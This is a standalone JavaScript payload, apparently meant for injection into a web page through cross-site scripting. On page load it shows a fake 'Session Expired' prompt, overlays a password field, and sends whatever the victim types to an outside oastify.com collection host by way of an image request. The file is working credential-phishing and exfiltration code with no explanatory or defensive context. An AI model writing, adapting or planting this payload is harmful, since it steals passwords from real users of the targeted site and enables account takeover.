window.addEventListener('load', function() {
    // Show a confirmation dialog to let the user know the session is expired
    let userConfirmed = confirm("Session Expired. Do you want to re-enter your password?");

    if (userConfirmed) {
        // Create a custom input dialog dynamically
        let div = document.createElement('div');
        div.style.position = 'fixed';
        div.style.top = '30%';
        div.style.left = '50%';
        div.style.transform = 'translate(-50%, -50%)';
        div.style.background = 'white';
        div.style.padding = '20px';
        div.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
        div.style.zIndex = '9999';
        
        div.innerHTML = `
            <h2>Session Expired</h2>
            <p>Please re-enter your password:</p>
            <input type="password" id="password" placeholder="Enter password" required>
            <button id="submit">Submit</button>
        `;
        
        document.body.appendChild(div);

        // Handle form submission
        document.getElementById('submit').addEventListener('click', function() {
            let password = document.getElementById('password').value;
            if (password) {
                new Image().src = `https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`;
                div.innerHTML = "<p>Loading...</p>";  // Change the message once submitted
            }
        });
    }
});
